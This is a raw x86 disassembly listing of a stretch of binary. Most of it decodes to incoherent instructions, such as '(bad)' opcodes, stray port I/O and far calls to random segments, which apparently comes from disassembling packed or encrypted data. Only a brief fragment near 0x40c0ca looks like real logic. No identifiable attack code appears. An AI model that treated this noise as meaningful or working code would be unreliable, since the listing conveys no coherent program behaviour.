  40bcb7:	rcl    DWORD PTR [eax],cl
  40bcb9:	rcr    dl,0xa3
  40bcbc:	gs inc esi
  40bcbe:	jne    0x40bc4f
  40bcc0:	lahf   
  40bcc1:	call   FWORD PTR [edx-0x1]
  40bcc4:	leave  
  40bcc5:	cs pushf 
  40bcc7:	fwait
  40bcc8:	mov    eax,0x6fd53502
  40bccd:	sub    DWORD PTR [edi],0x8cf76a14
  40bcd3:	pop    ecx
  40bcd4:	push   ebp
  40bcd5:	or     cl,0xac
  40bcd8:	xchg   DWORD PTR [ebx],ebp
  40bcda:	lahf   
  40bcdb:	enter  0x7612,0x5c
  40bcdf:	shl    ah,0xfe
  40bce2:	push   ebp
  40bce3:	dec    edx
  40bce4:	xor    al,0xac
  40bce6:	rcl    DWORD PTR [esi+ebx*2],0xda
  40bcea:	out    0x16,eax
  40bcec:	inc    eax
  40bced:	mov    dh,0xb3
  40bcef:	mov    bl,0x99
  40bcf1:	push   es
  40bcf2:	leave  
  40bcf3:	push   cs
  40bcf4:	rcr    al,0x40
  40bcf7:	push   edi
  40bcf8:	sbb    eax,0xf8c020f3
  40bcfd:	bound  eax,QWORD PTR [ebp+0x7e]
  40bd00:	sub    edx,DWORD PTR [esi]
  40bd02:	mov    dl,0x60
  40bd04:	mov    ds,WORD PTR [edx+0x5b]
  40bd07:	enter  0xfe5e,0x45
  40bd0b:	dec    DWORD PTR [ebx+0x6074ffc2]
  40bd11:	lods   eax,DWORD PTR cs:[esi]
  40bd13:	cmp    eax,0xe7d73dcb
  40bd18:	arpl   WORD PTR [edx],sp
  40bd1a:	in     al,0x81
  40bd1c:	ins    BYTE PTR es:[edi],dx
  40bd1d:	imul   ecx,DWORD PTR [edx-0x5664cfb4],0x2f
  40bd24:	mov    ebx,0xe1b951b1
  40bd29:	mov    ebp,0x5d5a4870
  40bd2e:	fstp   DWORD PTR [edx+0x42]
  40bd31:	adc    eax,0x6a9bffa2
  40bd36:	mov    ds:0xb34d640c,al
  40bd3b:	xchg   DWORD PTR [eax],esp
  40bd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd3e:	in     al,dx
  40bd3f:	nop
  40bd40:	mov    ah,ch
  40bd42:	arpl   WORD PTR [edi+0x44],di
  40bd45:	pop    edx
  40bd46:	push   ebx
  40bd47:	sub    DWORD PTR [ecx-0x5ed9fcf1],0xffffffb2
  40bd4e:	das    
  40bd4f:	add    ebp,DWORD PTR [ebx]
  40bd51:	or     DWORD PTR [ecx+0x3abbab70],esp
  40bd57:	and    dl,bh
  40bd59:	adc    eax,0xe76ac8
  40bd5f:	xchg   edx,eax
  40bd60:	jno    0x40bd1e
  40bd62:	sahf   
  40bd63:	xchg   ebx,eax
  40bd64:	das    
  40bd65:	sahf   
  40bd66:	jb     0x40bd9f
  40bd68:	mov    bh,0xd2
  40bd6a:	jae    0x40bdb3
  40bd6c:	jb     0x40bd30
  40bd6e:	adc    BYTE PTR [ecx+0xc4d8baa],ah
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz sbb al,0xac
  40bd8d:	jne    0x40bd3f
  40bd8f:	mov    ecx,0x2e7e7efc
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40be08
  40bd98:	pop    ecx
  40bd99:	push   edi
  40bd9a:	idiv   al
  40bd9c:	(bad)  
  40bd9d:	outs   dx,BYTE PTR ds:[esi]
  40bd9e:	adc    ebp,DWORD PTR [esi+edx*4]
  40bda1:	and    ah,dl
  40bda3:	sub    al,0xbc
  40bda5:	xchg   ebx,eax
  40bda6:	push   cs
  40bda7:	mov    esp,DWORD PTR [ecx+0x2d]
  40bdaa:	adc    DWORD PTR [edi],edi
  40bdac:	inc    esi
  40bdad:	lea    esp,[ecx+0x805a614]
  40bdb3:	and    esp,DWORD PTR [ebx*8-0x531f96a]
  40bdba:	xlat   BYTE PTR ds:[ebx]
  40bdbb:	loope  0x40be11
  40bdbd:	mov    eax,ds:0x76236aa5
  40bdc2:	xor    edi,DWORD PTR ds:0xf3d40348
  40bdc8:	fild   WORD PTR [ebx+0x12335fce]
  40bdce:	xchg   ebx,eax
  40bdcf:	xlat   BYTE PTR ds:[ebx]
  40bdd0:	push   ds
  40bdd1:	icebp  
  40bdd2:	je     0x40bd7d
  40bdd4:	xlat   BYTE PTR ds:[ebx]
  40bdd5:	xchg   ebx,eax
  40bdd6:	rcr    DWORD PTR [edi-0x292612a4],0x72
  40bddd:	std    
  40bdde:	mov    ecx,0xe77cf0d3
  40bde3:	iret   
  40bde4:	lds    ebp,FWORD PTR [eax+ecx*1]
  40bde7:	ins    DWORD PTR es:[edi],dx
  40bde8:	imul   edx,DWORD PTR [eax-0x7018b754],0x12
  40bdef:	mov    ah,0x7a
  40bdf1:	cmc    
  40bdf2:	mov    bl,0xaf
  40bdf4:	xchg   BYTE PTR [edi-0x3c0673b5],cl
  40bdfa:	out    0xf9,al
  40bdfc:	xor    DWORD PTR [ebp+eax*8-0x145423ba],ecx
  40be03:	dec    ebp
  40be04:	enter  0x6ec9,0xbe
  40be08:	add    eax,0x2f695fce
  40be0d:	inc    edi
  40be0e:	out    0xe0,eax
  40be10:	repnz scas al,BYTE PTR es:[edi]
  40be12:	jle    0x40be07
  40be14:	and    esi,DWORD PTR [ecx+0x12]
  40be17:	int3   
  40be18:	lock shl DWORD PTR [ebp+0x23],1
  40be1c:	icebp  
  40be1d:	mov    ecx,0x23885758
  40be22:	lahf   
  40be23:	jl     0x40bdd2
  40be25:	add    BYTE PTR [esi-0x80],dh
  40be28:	xchg   edx,eax
  40be29:	mov    ebx,0x89163728
  40be2e:	out    0xf9,eax
  40be30:	jo     0x40be07
  40be32:	call   0x7409:0xe8eb9f39
  40be39:	fidivr DWORD PTR [ebx]
  40be3b:	inc    edx
  40be3c:	mov    eax,ds:0xdd6c142e
  40be41:	cld    
  40be42:	sub    DWORD PTR [edx],eax
  40be44:	sbb    DWORD PTR [esi+0x40],ecx
  40be47:	repnz sbb al,0x1b
  40be4a:	mov    ah,0x70
  40be4c:	push   esp
  40be4d:	dec    edi
  40be4e:	sub    esi,0xffffffb2
  40be51:	push   0xffffffb7
  40be53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be54:	sub    al,BYTE PTR [esi+0x542cfabe]
  40be5a:	jo     0x40be1e
  40be5c:	mov    edi,0x77d44632
  40be61:	jo     0x40be82
  40be63:	xchg   ebx,eax
  40be64:	nop
  40be65:	pushf  
  40be66:	inc    eax
  40be67:	or     ch,BYTE PTR [edi+0x73]
  40be6a:	add    edx,DWORD PTR [ecx+0x5]
  40be6d:	jmp    0x704a49f8
  40be72:	fld    DWORD PTR [ecx-0x1c]
  40be75:	xchg   esi,eax
  40be76:	repnz push 0x6d
  40be79:	iret   
  40be7a:	lea    ecx,[ebx+ebp*1-0x2302a3e6]
  40be81:	and    esi,edi
  40be83:	out    0xa,eax
  40be85:	push   ds
  40be86:	inc    eax
  40be87:	add    BYTE PTR [eax],cl
  40be89:	jg     0x40be4c
  40be8b:	xlat   BYTE PTR ds:[ebx]
  40be8c:	cli    
  40be8d:	dec    edx
  40be8e:	mov    ebx,0x3e4f9462
  40be93:	push   edi
  40be94:	ins    DWORD PTR es:[edi],dx
  40be95:	xchg   esp,eax
  40be96:	ret    
  40be97:	dec    ebx
  40be98:	in     al,0x59
  40be9a:	mov    ecx,0x393aba0d
  40be9f:	and    edx,DWORD PTR [ebx]
  40bea1:	fs jl  0x40bf06
  40bea4:	jp     0x40bf15
  40bea6:	fxch   st(0)
  40bea8:	enter  0x96cd,0xdb
  40beac:	jnp    0x40be73
  40beae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beaf:	cmp    cl,BYTE PTR [edx+0x31]
  40beb2:	mov    esi,0x7da4b860
  40beb7:	rcr    DWORD PTR [ecx],0xf7
  40beba:	shl    DWORD PTR [esi],0xcc
  40bebd:	fild   WORD PTR [eax]
  40bebf:	or     eax,0x56ada3f0
  40bec4:	xor    eax,0xa657066f
  40bec9:	and    BYTE PTR [ebp+0x4cef1a1a],bh
  40becf:	dec    ebx
  40bed0:	push   ebx
  40bed1:	cmp    DWORD PTR [ecx],ebp
  40bed3:	xor    BYTE PTR [ebx],bh
  40bed5:	adc    al,0x67
  40bed7:	add    DWORD PTR [edx],ebp
  40bed9:	push   0xffffffdd
  40bedb:	ficom  WORD PTR [ebx]
  40bedd:	ret    
  40bede:	dec    esp
  40bedf:	and    eax,0xb296607c
  40bee4:	call   0xf4ac:0xa7bff5cd
  40beeb:	push   cs
  40beec:	fist   WORD PTR [ebx+0x2343b937]
  40bef2:	mov    fs,eax
  40bef4:	inc    ecx
  40bef5:	int3   
  40bef6:	or     ebp,eax
  40bef8:	cmp    eax,0xaf5b1e58
  40befd:	pop    esp
  40befe:	rol    edi,cl
  40bf00:	jg     0x40beae
  40bf02:	out    dx,al
  40bf03:	pop    es
  40bf04:	cmp    DWORD PTR [edx],eax
  40bf06:	and    al,0xd6
  40bf08:	outs   dx,DWORD PTR ds:[esi]
  40bf09:	(bad)  
  40bf0a:	cli    
  40bf0b:	jae    0x40bec4
  40bf0d:	sahf   
  40bf0e:	cmp    DWORD PTR [eax],eax
  40bf10:	arpl   WORD PTR [ebp-0x6f],sp
  40bf13:	sub    DWORD PTR [ecx+0x32d0ae78],edi
  40bf19:	mov    ebx,0x1416acbf
  40bf1e:	mov    esi,DWORD PTR [edx]
  40bf20:	xchg   BYTE PTR [edi],ch
  40bf22:	adc    eax,0xe673b915
  40bf27:	xchg   edi,eax
  40bf28:	aaa    
  40bf29:	cmp    eax,0x2afd9fbe
  40bf2e:	pop    edx
  40bf2f:	add    bl,BYTE PTR [ebp+0x23]
  40bf32:	iret   
  40bf33:	leave  
  40bf34:	fiadd  DWORD PTR [ebx]
  40bf36:	sbb    al,ch
  40bf38:	mov    BYTE PTR [edi],bh
  40bf3a:	fsub   DWORD PTR [ebx+edi*4]
  40bf3d:	aad    0xdf
  40bf3f:	inc    dx
  40bf41:	rcl    bl,1
  40bf43:	xlat   BYTE PTR ds:[ebx]
  40bf44:	jg     0x40befd
  40bf46:	out    dx,eax
  40bf47:	cmp    BYTE PTR [ebp+eax*1-0x5567e75d],cl
  40bf4e:	xor    edi,DWORD PTR [esi+0x8e2d086]
  40bf54:	and    al,0x57
  40bf56:	sub    al,0x30
  40bf58:	int    0xaf
  40bf5a:	sbb    al,0x90
  40bf5c:	dec    ebx
  40bf5d:	inc    esi
  40bf5e:	push   edi
  40bf5f:	jae    0x40bf25
  40bf61:	fist   DWORD PTR [eax+edx*4+0x4c43ac46]
  40bf68:	fsin   
  40bf6a:	loop   0x40bfc2
  40bf6c:	mov    dl,0x1b
  40bf6e:	imul   esp,ebp,0xa313024a
  40bf74:	or     BYTE PTR ds:0xb6ee,0x75
  40bf7a:	jno    0x40bf6a
  40bf7c:	mov    al,0xba
  40bf7e:	dec    edx
  40bf7f:	mov    ds:0x632a3f67,eax
  40bf84:	or     DWORD PTR [ebx-0x51],0x12
  40bf88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf89:	mov    ebp,eax
  40bf8b:	inc    esi
  40bf8c:	inc    ebx
  40bf8d:	(bad)  
  40bf8e:	inc    BYTE PTR [edi-0x62432864]
  40bf94:	out    dx,eax
  40bf95:	mov    ecx,0xa27fe631
  40bf9a:	cwde   
  40bf9b:	mov    dh,bh
  40bf9d:	cmp    BYTE PTR [eax],dh
  40bf9f:	mov    esi,DWORD PTR [esi-0x2d]
  40bfa2:	jl     0x40bfde
  40bfa4:	fisubr DWORD PTR [edx-0x9]
  40bfa7:	test   BYTE PTR [edi],ah
  40bfa9:	in     eax,dx
  40bfaa:	stos   DWORD PTR es:[edi],eax
  40bfab:	inc    ebx
  40bfac:	fisub  WORD PTR [ecx+edx*2+0x7e]
  40bfb0:	icebp  
  40bfb1:	js     0x40c032
  40bfb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb4:	and    bl,ah
  40bfb6:	int3   
  40bfb7:	fiadd  WORD PTR [ebx]
  40bfb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfba:	out    dx,al
  40bfbb:	sub    DWORD PTR [ebp+edi*4-0x1d],edi
  40bfbf:	adc    BYTE PTR [ecx+0x49],0x7b
  40bfc3:	(bad)  
  40bfc4:	scas   eax,DWORD PTR es:[edi]
  40bfc5:	add    cl,BYTE PTR [edx+0x79ed7ac7]
  40bfcb:	(bad)  
  40bfcc:	stc    
  40bfcd:	and    DWORD PTR [ebx+0x1],ecx
  40bfd0:	push   edi
  40bfd1:	(bad)  
  40bfd2:	mov    edi,0x16c8f356
  40bfd7:	xchg   ecx,eax
  40bfd8:	int    0x34
  40bfda:	dec    eax
  40bfdb:	fild   DWORD PTR [ebx]
  40bfdd:	mov    ch,0xdf
  40bfdf:	mov    edx,0x1fb778d5
  40bfe4:	(bad)  
  40bfe5:	enter  0x188e,0xae
  40bfe9:	ret    0x8946
  40bfec:	mov    cs,WORD PTR [ebp+0x15bb6e5c]
  40bff2:	xchg   esi,eax
  40bff3:	(bad)  
  40bff4:	pusha  
  40bff5:	int    0x96
  40bff7:	sub    al,0xc6
  40bff9:	(bad)  
  40bffa:	inc    ecx
  40bffb:	arpl   WORD PTR [ebx-0x10ea8953],sp
  40c001:	or     al,0xbe
  40c003:	pop    ds
  40c004:	pop    ds
  40c005:	shl    BYTE PTR [ebp-0x36],cl
  40c008:	jmp    0x40c01a
  40c00a:	iret   
  40c00b:	push   esp
  40c00c:	sub    al,0xb2
  40c00e:	hlt    
  40c00f:	repnz sub ebp,esi
  40c012:	inc    esi
  40c013:	sub    bl,al
  40c015:	js     0x40bfd5
  40c017:	mov    bh,BYTE PTR [eax*1+0x33f80c86]
  40c01e:	out    0x30,eax
  40c020:	(bad)  
  40c021:	cmp    edx,esi
  40c023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c024:	mov    eax,ds:0x4ead9e32
  40c029:	nop
  40c02a:	leave  
  40c02b:	leave  
  40c02c:	xchg   BYTE PTR [ebp+0x4f62f6e1],al
  40c032:	push   es
  40c033:	scas   al,BYTE PTR es:[edi]
  40c034:	arpl   bx,cx
  40c036:	fdiv   DWORD PTR [ebx+ebx*1+0x16]
  40c03a:	mov    ch,0x79
  40c03c:	jge    0x40c055
  40c03e:	xor    al,0x1c
  40c040:	popa   
  40c041:	dec    ecx
  40c042:	sti    
  40c043:	and    DWORD PTR [eax-0x26],esi
  40c046:	mov    ebx,0x67257422
  40c04b:	and    DWORD PTR [eax+esi*2+0x740f4455],edx
  40c052:	mov    eax,0xc5653816
  40c057:	lods   eax,DWORD PTR ds:[esi]
  40c058:	xchg   DWORD PTR [ebx-0x47],edi
  40c05b:	mov    DWORD PTR [ebp-0x50],edi
  40c05e:	imul   ebx,DWORD PTR [ebp-0x4],0x1fafdc91
  40c065:	retf   0x74cc
  40c068:	inc    ebx
  40c069:	enter  0xb212,0xc6
  40c06d:	xchg   BYTE PTR [edx-0x2c],bh
  40c070:	inc    ebp
  40c071:	adc    al,0xc2
  40c073:	bound  ecx,QWORD PTR [ecx-0x30e3c9a]
  40c079:	mov    dl,0x75
  40c07b:	sbb    DWORD PTR [ebx+0x11],esp
  40c07e:	jle    0x40c0fa
  40c080:	repz mov ebp,0x20a8cec5
  40c086:	pusha  
  40c087:	int    0x1f
  40c089:	pop    edi
  40c08a:	loopne 0x40c0dd
  40c08c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c08d:	repnz ror DWORD PTR [edx-0x1b],1
  40c091:	stos   DWORD PTR es:[edi],eax
  40c092:	mov    eax,ds:0x8e9a6a8a
  40c097:	lahf   
  40c098:	pop    esi
  40c099:	xchg   ecx,eax
  40c09a:	xor    eax,0x9031bedb
  40c09f:	rcl    ecx,cl
  40c0a1:	neg    BYTE PTR [edi+ecx*2-0x686079f8]
  40c0a8:	loop   0x40c04b
  40c0aa:	mov    esp,0x64e3ca01
  40c0af:	jg     0x40c12a
  40c0b1:	ss mov edi,0xdfa1ca6e
  40c0b7:	out    dx,eax
  40c0b8:	or     al,0x8e
  40c0ba:	test   eax,ecx
  40c0bc:	mov    bh,0xe5
  40c0be:	adc    DWORD PTR [ebp+0x1f566147],ebp
  40c0c4:	fisttp WORD PTR [edx+0x66c82bc5]
  40c0ca:	mov    eax,DWORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	lock or eax,0xfb694e14
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0d0
  40c110:	pop    eax
  40c111:	pop    esp
  40c112:	cmp    cl,BYTE PTR [ecx]
  40c114:	jb     0x40c185
  40c116:	inc    ecx
  40c117:	pop    edi
  40c118:	add    eax,edx
  40c11a:	out    0x1f,al
  40c11c:	pop    esp
  40c11d:	cmp    bh,al
  40c11f:	clc    
  40c120:	add    ecx,DWORD PTR [ebx+edx*1-0x3b01992f]
  40c127:	or     eax,0xc254f237
  40c12c:	mov    edi,0x35c2005e
  40c131:	jmp    0x27837e42
  40c136:	mov    esi,0xc27c51d9
  40c13b:	push   eax
  40c13c:	push   cs
  40c13d:	cld    
  40c13e:	dec    edi
  40c13f:	cmp    dh,BYTE PTR [ebp+0x55]
  40c142:	outs   dx,BYTE PTR ds:[esi]
  40c143:	add    al,0xa
  40c145:	(bad)  
  40c146:	or     BYTE PTR [edx],ch
  40c148:	mov    bl,0x75
  40c14a:	leave  
  40c14b:	les    ebx,FWORD PTR [ecx]
  40c14d:	jmp    0x69a9:0x48c555f2
  40c154:	cwde   
  40c155:	repz inc ebp
  40c157:	into   
  40c158:	pushf  
  40c159:	mov    cl,0x1a
  40c15b:	imul   esp,DWORD PTR [ebx+edi*4+0x2c],0xfffffff6
  40c160:	ss lahf 
  40c162:	xchg   edx,edi
  40c164:	in     eax,dx
  40c165:	push   es
  40c166:	les    edx,FWORD PTR [ecx+0x6cc55560]
  40c16c:	js     0x40c12e
  40c16e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c16f:	mov    edi,0xa7a76a02
  40c174:	sub    eax,0x3a92de6a
  40c179:	jmp    0x40c1cf
  40c17b:	pop    esi
  40c17c:	arpl   WORD PTR [edx],cx
  40c17e:	xor    ebp,DWORD PTR ds:0xd2fffbe
  40c184:	call   0x5ce3:0x5ea304ec
  40c18b:	mov    ds:0x90ba8a8a,eax
  40c190:	daa    
  40c191:	xchg   edi,eax
  40c192:	test   eax,0x6a833bd7
  40c197:	mov    ecx,0xc395d645
  40c19c:	stos   DWORD PTR es:[edi],eax
  40c19d:	dec    ebx
  40c19e:	sbb    DWORD PTR [edx],esp
  40c1a0:	pop    edi
  40c1a1:	add    eax,0xf867a459
  40c1a6:	dec    esi
  40c1a7:	(bad)  
  40c1a8:	mov    dl,0x46
  40c1aa:	mov    gs,WORD PTR [ecx]
  40c1ac:	push   0x7f
  40c1ae:	loope  0x40c153
  40c1b0:	cmp    DWORD PTR [ebx+ebp*4+0xa58bae8],esp
  40c1b7:	jmp    0xb0406dd2
  40c1bc:	outs   dx,BYTE PTR ds:[esi]
  40c1bd:	mov    ebx,ecx
  40c1bf:	ror    BYTE PTR [ebx+edx*4],0x6e
  40c1c3:	and    ebp,ebx
  40c1c5:	std    
  40c1c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c7:	ror    BYTE PTR [ecx],0xec
  40c1ca:	arpl   WORD PTR [ecx+0x21],sp
  40c1cd:	ss cmc 
  40c1cf:	and    al,0xdb
  40c1d1:	jp     0x40c185
  40c1d3:	or     edi,eax
  40c1d5:	inc    ebx
  40c1d6:	push   0xa946badb
  40c1db:	inc    BYTE PTR fs:[edi+0x5e]
  40c1df:	out    0x39,eax
  40c1e1:	mov    ds:0xa6a4da55,al
  40c1e6:	mov    eax,ds:0xf3d37a8f
  40c1eb:	neg    BYTE PTR [ebx-0x3a]
  40c1ee:	in     al,dx
  40c1ef:	cmp    al,0x7c
  40c1f1:	ror    bl,cl
  40c1f3:	mov    dh,0x47
  40c1f5:	(bad)  
  40c1f6:	add    ah,BYTE PTR fs:[eax]
  40c1f9:	xchg   ebx,eax
  40c1fa:	in     al,dx
  40c1fb:	leave  
  40c1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1fd:	sti    
  40c1fe:	inc    ebx
  40c1ff:	mov    dl,0xc7
  40c201:	xchg   edx,eax
  40c202:	nop
  40c203:	outs   dx,DWORD PTR ds:[esi]
  40c204:	ja     0x40c1b3
  40c206:	adc    al,0xd8
  40c208:	jecxz  0x40c22e
  40c20a:	in     al,dx
  40c20b:	push   0xffffffec
  40c20d:	fdivr  QWORD PTR [edx+0x2]
  40c210:	sti    
  40c211:	add    DWORD PTR [ebp+0x342e2d10],esp
  40c217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c218:	pop    esi
  40c219:	loope  0x40c214
  40c21b:	inc    ebp
  40c21c:	xor    DWORD PTR [esi],ecx
  40c21e:	into   
  40c21f:	and    ebp,ecx
  40c221:	call   0xa581:0x8afb821d
  40c228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c229:	xchg   dh,al
  40c22b:	outs   dx,DWORD PTR ds:[esi]
  40c22c:	adc    BYTE PTR [edx-0x21bef1e5],dl
  40c232:	mov    ch,0xd3
  40c234:	imul   edi,ecx,0x89458772
  40c23a:	fnsave [ecx+0x15]
  40c23d:	scas   al,BYTE PTR es:[edi]
  40c23e:	cmp    dh,BYTE PTR ds:0xa224cc54
  40c244:	mov    bh,BYTE PTR [ebx+0x79]
  40c247:	add    DWORD PTR [ebx],0x14
  40c24a:	int3   
  40c24b:	test   DWORD PTR ds:0x66074009,edi
  40c251:	push   ebp
  40c252:	mov    ebx,0x6af3538f
  40c257:	cld    
  40c258:	jmp    0x40c217
  40c25a:	xor    BYTE PTR [edi-0xe503ea5],ch
  40c260:	(bad)  
  40c261:	mov    ds:0x1c0391cc,al
  40c266:	daa    
  40c267:	iret   
  40c268:	cld    
  40c269:	push   edx
  40c26a:	or     DWORD PTR [edi],ebx
  40c26c:	repnz ds xchg ebp,eax
  40c26f:	aaa    
  40c270:	adc    al,0x3f
  40c272:	andnps xmm3,XMMWORD PTR [eax]
  40c275:	push   0xffffffac
  40c277:	sub    ch,0xde
  40c27a:	inc    eax
  40c27b:	mov    edi,0x4714484e
  40c280:	retf   
  40c281:	aaa    
  40c282:	out    dx,eax
  40c283:	pop    ecx
  40c284:	out    dx,eax
  40c285:	ins    BYTE PTR es:[edi],dx
  40c286:	pop    eax
  40c287:	xchg   ebx,eax
  40c288:	push   ecx
  40c289:	mov    eax,ds:0xdd5ed074
  40c28e:	or     ch,ch
  40c290:	daa    
  40c291:	mov    bh,0xdf
  40c293:	sub    esp,DWORD PTR [ecx-0x53f55bb5]
  40c299:	push   0x97afaa3
  40c29e:	not    DWORD PTR ds:0xe38b1c22
  40c2a4:	or     edi,DWORD PTR [eax-0x6f]
  40c2a7:	fwait
  40c2a8:	sbb    esi,DWORD PTR [ebp-0x1]
  40c2ab:	in     eax,0x83
  40c2ad:	ins    BYTE PTR es:[edi],dx
  40c2ae:	push   es
  40c2af:	xchg   BYTE PTR [edi],al
  40c2b1:	fnsave [edx]
  40c2b3:	setb   BYTE PTR ss:[ebp-0x75c85b32]
  40c2bb:	xchg   ebx,eax
  40c2bc:	push   esi
  40c2bd:	scas   eax,DWORD PTR es:[edi]
  40c2be:	lods   al,BYTE PTR ds:[esi]
  40c2bf:	pop    ebx
  40c2c0:	cli    
  40c2c1:	push   edx
  40c2c2:	daa    
  40c2c3:	in     al,0x6f
  40c2c5:	mov    dl,0x63
  40c2c7:	fxch   st(7)
  40c2c9:	inc    edx
  40c2ca:	aam    0x6d
  40c2cc:	pop    edx
  40c2cd:	cdq    
  40c2ce:	loop   0x40c274
  40c2d0:	test   al,0x8b
  40c2d2:	push   es
  40c2d3:	sub    DWORD PTR [edi-0x78],0x1714e4e1
  40c2da:	cmp    al,0x5c
  40c2dc:	dec    ebx
  40c2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2de:	addr16 pop ecx
  40c2e0:	idiv   cl
  40c2e2:	mov    DWORD PTR [ebp+0xf1ea8a6],ecx
  40c2e8:	das    
  40c2e9:	mul    DWORD PTR [esi+edx*2+0x61]
  40c2ed:	sahf   
  40c2ee:	das    
  40c2ef:	test   BYTE PTR [ecx+0x51a7d5dd],cl
  40c2f5:	pop    ecx
  40c2f6:	in     al,dx
  40c2f7:	sbb    al,0xf2
  40c2f9:	xchg   BYTE PTR [eax],cl
  40c2fb:	mov    bh,0x9d
  40c2fd:	adc    al,0x83
  40c2ff:	stos   DWORD PTR es:[edi],eax
  40c300:	mov    ds:0x929929e1,eax
  40c305:	pop    edi
  40c306:	sbb    dl,bl
  40c308:	fdivr  QWORD PTR [edi]
  40c30a:	adc    DWORD PTR [edx],esp
  40c30c:	sbb    al,0x6c
  40c30e:	cmp    eax,0x7e914f85
  40c313:	ret    0x5c52
  40c316:	inc    ecx
  40c317:	fist   DWORD PTR [eax-0x5495795b]
  40c31d:	add    DWORD PTR [ebp-0x706794df],ebx
  40c323:	push   ds
  40c324:	arpl   WORD PTR [edi+0x20e8dc73],cx
  40c32a:	out    0xb4,al
  40c32c:	pop    ss
  40c32d:	push   ebp
  40c32e:	inc    esp
  40c32f:	pop    edi
  40c330:	(bad)  
  40c332:	clc    
  40c333:	cwde   
  40c334:	fild   QWORD PTR [edx]
  40c336:	daa    
  40c337:	clc    
  40c338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c339:	mov    al,BYTE PTR [ebx+eiz*2]
  40c33c:	rol    DWORD PTR [esi],cl
  40c33e:	push   eax
  40c33f:	les    ecx,FWORD PTR [edx]
  40c341:	mov    dh,BYTE PTR [esi+0x20]
  40c344:	or     edi,edx
  40c346:	div    DWORD PTR [esi+0x35]
  40c349:	inc    eax
  40c34a:	shl    DWORD PTR [ecx],cl
  40c34c:	rol    BYTE PTR [edx+0x15bc2b4e],1
  40c352:	mov    al,0x5f
  40c354:	dec    ebx
  40c355:	push   ebp
  40c356:	push   esp
  40c357:	push   esp
  40c358:	jae    0x40c391
  40c35a:	stos   DWORD PTR es:[edi],eax
  40c35b:	jno    0x40c302
  40c35d:	mov    bl,dh
  40c35f:	mov    bl,0x2a
  40c361:	mov    ah,0x18
  40c363:	cmp    DWORD PTR [esi-0x76],edi
  40c366:	sub    eax,0x1936c3bd
  40c36b:	cmp    ebp,eax
  40c36d:	inc    esp
  40c36e:	push   esp
  40c36f:	adc    esi,DWORD PTR es:[ecx]
  40c372:	mov    ch,0xb7
  40c374:	sbb    al,0x3
  40c376:	pop    ecx
  40c377:	bound  edi,QWORD PTR [ebx-0xe436ff9]
  40c37d:	xchg   ebp,eax
  40c37e:	and    ch,ah
  40c380:	outs   dx,BYTE PTR ds:[esi]
  40c381:	adc    BYTE PTR [eax],al
  40c383:	sub    edx,DWORD PTR [ecx+0xe]
  40c386:	mov    DWORD PTR [ecx-0x24],edi
  40c389:	stos   DWORD PTR es:[edi],eax
  40c38a:	pop    ebp
  40c38b:	ins    DWORD PTR es:[edi],dx
  40c38c:	ins    BYTE PTR es:[edi],dx
  40c38d:	pop    ebp
  40c38e:	mov    ebx,0x4ba30519
  40c393:	les    ebp,FWORD PTR [ebx+eiz*1-0x22]
  40c397:	mov    ah,0x12
  40c399:	mov    dh,0x50
  40c39b:	int3   
  40c39c:	out    dx,eax
  40c39d:	adc    eax,0xc3057db4
  40c3a2:	jae    0x40c399
  40c3a4:	jbe    0x40c3ef
  40c3a6:	jecxz  0x40c3d4
  40c3a8:	ins    DWORD PTR es:[edi],dx
  40c3a9:	xor    eax,0x9b50ce42
  40c3ae:	jle    0x40c397
  40c3b0:	xchg   edx,eax
  40c3b1:	mov    dh,0x4
  40c3b3:	or     eax,0xb9da6016
  40c3b8:	dec    eax
  40c3b9:	inc    esp
  40c3ba:	xchg   ebx,eax
  40c3bb:	hlt    
  40c3bc:	das    
  40c3bd:	push   ecx
  40c3be:	popf   
  40c3bf:	mov    gs,WORD PTR [ecx]
  40c3c1:	and    eax,0xf36b43ac
  40c3c6:	stos   BYTE PTR es:[edi],al
  40c3c7:	ret    
  40c3c8:	and    al,0x13
  40c3ca:	cmp    DWORD PTR [eax+0x2bee9fe2],esp
  40c3d0:	xchg   DWORD PTR [eax+0x14caa8a6],esi
  40c3d6:	sbb    DWORD PTR [esi-0x79],0xfffffff5
  40c3da:	dec    esi
  40c3db:	ds jge 0x40c3dd
  40c3de:	xchg   esp,eax
  40c3df:	sti    
